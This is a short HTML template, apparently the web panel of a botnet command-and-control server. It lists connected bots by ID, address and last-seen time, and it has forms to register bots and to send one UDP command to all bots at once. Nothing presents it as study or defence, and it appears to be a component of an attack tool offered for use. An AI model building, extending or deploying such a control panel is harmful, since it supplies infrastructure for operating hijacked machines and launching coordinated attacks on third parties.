<!DOCTYPE html>
<html>
<head>
    <title>Command and Control</title>
</head>
<body>
    <h1>Command and Control</h1>
    <h2>Connected Bots:</h2>
    <ul>
        {{ range $index, $bot := . }}
        <li>{{ $bot.ID }} - {{ $bot.Address }} (Last Seen: {{ $bot.LastSeen }})</li>
        {{ end }}
    </ul>
    <h2>Register New Bot:</h2>
    <form action="/register" method="post">
        <label for="bot_id">Bot ID:</label>
        <input type="text" name="bot_id" id="bot_id" required>
        <br>
        <label for="bot_address">Bot Address:</label>
        <input type="text" name="bot_address" id="bot_address" required>
        <br>
        <input type="submit" value="Register Bot">
    </form>
    <h2>Send UDP Command to All Bots:</h2>
    <form action="/udp" method="post">
        <label for="command">Command:</label>
        <input type="text" name="command" id="command" required>
        <br>
        <input type="submit" value="Send UDP Command">
    </form>
    <h2>Monitor Stats</h2>
    <a href="/monitor">View Monitor</a>
</body>
</html>
